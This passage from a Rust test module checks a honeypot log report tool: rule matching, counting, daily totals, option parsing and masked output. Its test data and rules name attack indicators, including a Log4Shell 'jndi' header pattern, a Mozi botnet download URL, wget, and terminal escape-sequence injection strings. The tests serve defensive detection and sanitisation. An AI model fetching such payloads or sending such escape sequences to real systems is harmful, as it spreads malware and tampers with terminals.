        assert!(rule(Field::Header, "${JNDI:").matches(&visit(WEB_LINE)));
        assert!(rule(Field::Command, "mozi.M").matches(&visit(SHELL_LINE)));
    }

    #[test]
    fn ex7_only_looks_in_its_own_field() {
        assert!(!rule(Field::Path, "jndi").matches(&visit(WEB_LINE)));
        assert!(!rule(Field::Url, "cd /tmp").matches(&visit(SHELL_LINE)));
        assert!(rule(Field::Any, "jndi").matches(&visit(WEB_LINE)));
    }

    #[test]
    fn ex7_no_match_is_false() {
        assert!(!rule(Field::Any, "nothing like this").matches(&visit(SHELL_LINE)));
        assert!(!rule(Field::Any, "admin").matches(&visit(LOGIN_LINE)));
    }

    #[test]
    fn ex8_counts_and_remembers_addresses() {
        let mut hits = RuleHits::default();
        hits.record(&visit(SHELL_LINE));
        hits.record(&visit(WEB_LINE));
        hits.record(&visit(LEFT_LINE));
        assert_eq!(hits.visits, 3);
        assert_eq!(hits.addresses.len(), 2);
    }

    #[test]
    fn ex8_keeps_the_first_and_last_time_in_any_order() {
        let mut hits = RuleHits::default();
        for time in [50, 10, 90, 30] {
            hits.record(&LoggedVisit {
                time,
                ..LoggedVisit::default()
            });
        }
        assert_eq!(hits.first_seen, Some(10));
        assert_eq!(hits.last_seen, Some(90));
    }

    #[test]
    fn ex9_counts_by_day() {
        let report = sample_report(Vec::new());
        assert_eq!(report.visits, 4);
        assert_eq!(report.unreadable_lines, 1);
        let days: Vec<(String, DayTotals)> = report
            .days
            .iter()
            .map(|(date, day)| (date.to_string(), *day))
            .collect();
        assert_eq!(
            days,
            [
                (
                    "2026-11-03".to_string(),
                    DayTotals {
                        visits: 2,
                        logins: 1,
                        commands: 3,
                        requests: 0
                    }
                ),
                (
                    "2026-11-04".to_string(),
                    DayTotals {
                        visits: 2,
                        logins: 0,
                        commands: 0,
                        requests: 1
                    }
                ),
            ]
        );
    }

    #[test]
    fn ex9_counts_each_list() {
        let report = sample_report(Vec::new());
        assert_eq!(report.usernames.top(10), [("admin", 1), ("root", 1)]);
        assert_eq!(report.passwords.top(10), [("hunter2", 1), ("root", 1)]);
        assert_eq!(report.commands.distinct(), 3);
        assert_eq!(report.urls.top(10), [("http://198.51.100.9/Mozi.m", 1)]);
        assert_eq!(report.services.top(10), [("telnet", 3), ("http", 1)]);
        assert_eq!(report.addresses.top(1), [("203.0.113.3", 2)]);
    }

    #[test]
    fn ex9_paths_leave_off_the_query_string() {
        let report = sample_report(Vec::new());
        assert_eq!(report.paths.top(10), [("/cgi-bin/luci/;stok=/locale", 1)]);
    }

    #[test]
    fn ex9_something_that_was_not_http_has_no_path() {
        let mut report = Report::new(Vec::new());
        let mut not_http = web_visit_with_body(b"\x16\x03");
        not_http.http.as_mut().unwrap().method = String::new();
        report.add(&not_http);
        assert_eq!(report.paths.distinct(), 0);
    }

    #[test]
    fn ex9_records_rule_hits() {
        let report = sample_report(vec![
            rule(Field::Any, "jndi"),
            rule(Field::Command, "wget"),
            rule(Field::Path, "never"),
        ]);
        let hits: Vec<usize> = report.rules.iter().map(|(_, hits)| hits.visits).collect();
        assert_eq!(hits, [1, 1, 0]);
        assert_eq!(report.rules[0].1.first_seen, Some(1793754000));
    }

    #[test]
    fn ex10_describes_changes() {
        assert_eq!(change(713, Some(520)), "+193");
        assert_eq!(change(500, Some(520)), "-20");
        assert_eq!(change(520, Some(520)), "same");
        assert_eq!(change(0, Some(u64::MAX)), format!("-{}", u64::MAX));
        assert_eq!(change(713, None), "first day");
    }

    #[test]
    fn ex11_reads_the_command_line() {
        let options =
            ReportOptions::from_args(&args("logs --rules r.txt --top 20 --show-secrets")).unwrap();
        assert_eq!(
            options,
            ReportOptions {
                folder: PathBuf::from("logs"),
                rules: Some(PathBuf::from("r.txt")),
                top: 20,
                show_secrets: true,
            }
        );
    }

    #[test]
    fn ex11_the_defaults() {
        let options = ReportOptions::from_args(&args("logs")).unwrap();
        assert_eq!(options.rules, None);
        assert_eq!(options.top, DEFAULT_TOP);
        assert!(!options.show_secrets);
    }

    #[test]
    fn ex11_the_folder_can_come_last() {
        let options = ReportOptions::from_args(&args("--show-secrets logs")).unwrap();
        assert_eq!(options.folder, PathBuf::from("logs"));
    }

    #[test]
    fn ex11_mistakes_are_errors() {
        for bad in [
            "",
            "--show-secrets",
            "logs other",
            "logs --rules",
            "logs --top",
            "logs --top 0",
            "logs --top ten",
            "logs --show-secret",
        ] {
            let result = ReportOptions::from_args(&args(bad));
            assert_eq!(
                result.unwrap_err().kind(),
                io::ErrorKind::InvalidInput,
                "{bad}"
            );
        }
    }

    #[test]
    fn ex11_the_whole_report() {
        let report = sample_report(vec![rule(Field::Any, "jndi")]);
        let text = report.render(10, false);
        assert!(text.starts_with("4 visits from 3 addresses, 2026-11-03 to 2026-11-04.\n"));
        assert!(text.contains("1 lines couldn't be read"));
        assert!(text.contains("2026-11-04  visits      2 (same)  logins     0 (-1)"));
        assert!(text.contains("hxxp://198[.]51[.]100[.]9/Mozi[.]m"));
        assert!(text.contains("  test  [any]  visits 1  addresses 1  first 2026-11-04"));
    }

    #[test]
    fn ex11_a_hostile_line_cannot_reach_the_terminal() {
        let mut report = Report::new(vec![rule(Field::Any, "x")]);
        report.add(&LoggedVisit {
            time: 1,
            source_ip: "\u{1b}]0;owned\u{7}".to_string(),
            username: Some("\u{1b}[31mred".to_string()),
            shell: Some(LoggedShell {
                commands: vec!["\u{1b}[2J".to_string()],
                urls: vec!["\u{1b}[5m".to_string()],
            }),
            ..LoggedVisit::default()
        });
        for show_secrets in [false, true] {
            let text = report.render(10, show_secrets);
            assert!(
                !text.chars().any(|c| c.is_control() && c != '\n'),
                "{text:?}"
            );
        }
    }

    #[test]
    fn ex11_passwords_and_addresses_are_hidden_by_default() {
        let text = sample_report(Vec::new()).render(10, false);
        for secret in ["hunter2", "203.0.113.1", "203.0.113.2", "203.0.113.3"] {
            assert!(!text.contains(secret), "{secret}");
        }
        assert!(text.contains("203.0.x.x"));
    }

    #[test]
    fn ex11_secrets_show_only_when_asked() {
        let text = sample_report(Vec::new()).render(10, true);
        assert!(text.contains("hunter2"));
        assert!(text.contains("203.0.113.1"));
    }
}
